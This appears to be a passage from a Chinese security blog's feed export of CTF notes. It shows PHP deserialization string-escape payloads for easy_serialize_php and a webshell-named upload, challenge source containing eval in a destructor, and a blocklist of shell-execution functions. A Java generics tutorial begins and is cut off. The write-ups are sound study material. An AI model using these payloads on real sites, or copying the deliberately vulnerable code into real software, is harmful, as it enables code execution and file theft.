class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:7:&quot;</span><span class="number">1</span>@<span class="number">1.</span>com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:5:&quot;</span>hello<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>@<span class="number">1.</span>com</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname&quot;</span></span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;photo&quot;</span>; filename=<span class="string">&quot;muma.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">what can i say</span><br><span class="line">------WebKitFormBoundary829AijVZyBKQPaGz--</span><br></pre></td></tr></table></figure></li></ol><h2 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h2><h3 id="基础梳理-1"><a href="#基础梳理-1" class="headerlink" title="-基础梳理"></a>-基础梳理</h3><ol><li>底层知识点: 见字符串逃逸标题</li><li><strong>构造方法</strong>: 由于长度不变但是实际内容替换减短会包含后面正常的部分，利用通过长度判断的特性，通过另一个属性值进行构造可以自定义第一个属性后的完全自定义</li></ol><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h4 id="例1的思考与过程-1"><a href="#例1的思考与过程-1" class="headerlink" title="-例1的思考与过程"></a>-例1的思考与过程</h4><ol><li>分析<ol><li><p>思路其实很清晰</p></li><li><p>function show_image拿到flag文件可以的话，phpinfo查看信息 –&gt; auto_append_file:d0g3_f1ag.php</p></li><li><p><code>$SESSION</code>要控制<code>img</code>属性的值，这里有两点注意</p><ol><li>img会同通过img_path设定</li><li>总体会被filter过滤</li></ol></li><li><p>找找控制源，<code>extract($_POST)</code>显然是一个，可以将SESSION覆盖掉，但是最重要的img_path呢？还会加密，没法绕过吧，这里考虑从user处开始通过字符串逃逸获取自定义的反序列化</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. origin</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:8:&quot;img_path&quot;;s:8:&quot;img_path&quot;;s:x:&quot;idontknow&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 2. target</span></span><br><span class="line"><span class="comment"> *      a:3:&#123;whaterver;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;whatever</span></span><br><span class="line"><span class="comment"> * 3. 构造</span></span><br><span class="line"><span class="comment"> *      1. function可以构造img，构造&#125;来忽略后续的既定部分即可，为了不被认为function的一部分将function的部分使用过滤替换掉</span></span><br><span class="line"><span class="comment"> *          a:3&#123;s:4:&quot;user&quot;;s:x:&quot;x&quot;;s:8:&quot;function&quot;;s:yy:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          // yy那里肯定两位数，x处是要被过滤的，可以同故宫算式算出来</span></span><br><span class="line"><span class="comment"> *      2. 需要被吞掉的内容</span></span><br><span class="line"><span class="comment"> *          &quot;;s:8:&quot;function&quot;;s:yy: 长度为22</span></span><br><span class="line"><span class="comment"> *          3*6+4=22    这里要是凑不到可以到function值;前多加进行拼凑，只要被覆盖的长度不变就可以不调</span></span><br><span class="line"><span class="comment"> *      3. 传入参数</span></span><br><span class="line"><span class="comment"> *          user: flagphpphpphpphpphpphp</span></span><br><span class="line"><span class="comment"> *          function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="comment"> *          img: whatever</span></span><br><span class="line"><span class="comment"> *      4. 构造成果序列化的字符串：a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:45:&quot;;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:8:&quot;img_path&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="comment"> * 4. 打不通，改 --&gt; 因为a:3，数组的话元素数量也要对上</span></span><br><span class="line"><span class="comment"> *      1.  function: ;s:8:&quot;img_path&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;add&quot;;s:5:&quot;hello&quot;;&#125;，其他不变，可以打通了</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="例1总结"><a href="#例1总结" class="headerlink" title="*-例1总结"></a>*-例1总结</h4><ol><li>有机会过一遍phpinfo</li><li><strong>box model</strong>: 在分析时注意一下各个参数之间的关系，不要搞混了，这里理解了序列化后结果和判断条件没有任何关系后会很顺利，不会怪怪的；序列化的function和<code>_SESSION[function]</code>后来也是隔离开的，因为extract的覆盖</li><li><strong>尽量在本地环境上试一试</strong>，纠错快很多</li></ol><h4 id="例1源码"><a href="#例1源码" class="headerlink" title="-例1源码"></a>-例1源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyRevenge_强网24</title>
      <link href="/2024/11/06/ProxyRevenge_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/06/ProxyRevenge_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Platform_强网24</title>
      <link href="/2024/11/06/Platform_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/06/Platform_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol><li>前端没有东西开扫，有<a href="http://www.zip/">www.zip</a></li><li>目标就是notous…中析构执行任意代码，问题就是访问不到有些难绷，序列化和反序列化？<ol><li>需要从session入手，查查php seesion利用方式，发现有一个反序列化漏洞，看一看，差不多了解了<ol><li>session写入键供后续反序列化，生成notouc…对象，注意到每一次访问都会进行读取，5.5.4后默认php_serialize(复现看不到版本，但是看wp一部分是php方式)，使用竖线<code>|</code>来实现加载时的反序列化</li><li>注意到str_replace有双写绕过，但是数字限定了，需要使用字符串逃逸bro</li></ol></li></ol></li><li>顺带一提一个其他思路：注意到有文件包含，后面有文件写入，可不可以写入文件中进行包含执行？这里肯定不可以，主要还是看线索</li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><ol><li><code>www.zip</code>的内容</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dashboard.php</span></span><br><span class="line">&lt;p&gt;你好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]); <span class="meta">?&gt;</span>！&lt;/p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionPath</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sensitiveFunctions</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Session has not been started. Please start a session before using this class.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionPath = <span class="title function_ invoke__">session_save_path</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getSessionFilePath</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sessionPath . <span class="string">&quot;/sess_&quot;</span> . <span class="variable language_">$this</span>-&gt;sessionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全1_类与反射</title>
      <link href="/2024/11/04/Java%E5%AE%89%E5%85%A81_%E7%B1%BB%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/11/04/Java%E5%AE%89%E5%85%A81_%E7%B1%BB%E4%B8%8E%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="java中的类"><a href="#java中的类" class="headerlink" title="java中的类"></a>java中的类</h2><h3 id="宏观概念"><a href="#宏观概念" class="headerlink" title="宏观概念"></a>宏观概念</h3><ol><li>java中的类是静态的，而php中的类是动态的</li></ol><h3 id="Final关键字"><a href="#Final关键字" class="headerlink" title="Final关键字"></a>Final关键字</h3><blockquote><p>类似于cpp中的const</p></blockquote><ol><li>final 变量：值一旦被赋值就不能再改变。</li><li>final 方法：不能被子类重写。</li><li>final 类：不能被继承。</li><li>final 参数：在方法体内不能被修改。</li><li>final 和匿名内部类：匿名内部类中使用的外部类局部变量必须是 final 或 effectively final</li></ol><h2 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h2><h3 id="简要引入"><a href="#简要引入" class="headerlink" title="简要引入"></a>简要引入</h3><ol><li>java的泛型就类似于cpp中的模板，通过<strong>将类型作为参数</strong>，并通过此参数来定义代码块的类型，实现代码的复用</li><li>Java中的泛型应用于三种东西上：泛型类、泛型接口、泛型方法</li><li><em><strong>java的泛型是伪泛型</strong></em>: Java泛型这个特性是从JDK 1.5才开始加入的，因此为了兼容之前的版本，Java泛型的实现采取了“伪泛型”的策略，即Java在语法上支持泛型，但是在编译阶段会进行所谓的“类型擦除”（Type Erasure），将所有的泛型表示（尖括号中的内容）都替换为具体的类型（其对应的原生态类型），就像完全没有泛型一样 –&gt; 接下来会有部分进行说明</li></ol><h3 id="三种应用"><a href="#三种应用" class="headerlink" title="三种应用"></a>三种应用</h3><h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><ol><li><code>Notepad&lt;String,Integer&gt; t = null ;</code>在创建时确定一个类的对象的泛型参数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Notepad</span>&lt;K,V&gt;&#123;       <span class="comment">// 此处指定了两个泛型类型  </span></span><br><span class="line">    <span class="keyword">private</span> K key ;     <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">private</span> V value ;   <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">public</span> K <span class="title function_">getKey</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">getValue</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(K key)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.key = key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(V value)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">------</span><br><span class="line">著作权归<span class="meta">@pdai</span>所有</span><br><span class="line">原文链接：https:<span class="comment">//pdai.tech/md/java/basic/java-basic-x-generic.html</span></span><br></pre></td></tr></table></figure><h4 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h4><ol><li><p><code>IInfo&lt;String&gt; i = null;</code>和<code>IInfo&lt;String&gt; abc = new Info&lt;String&gt;()</code>在声明泛型对象时确定泛型参数</p></li><li><p><em><strong>Q: 泛型接口的子类一定是泛型类？</strong></em></p><ol><li>A: 并不是</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Processor</span>&lt;T&gt; &#123;</span><br><span class="line">   T <span class="title function_">process</span><span class="params">(T input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title 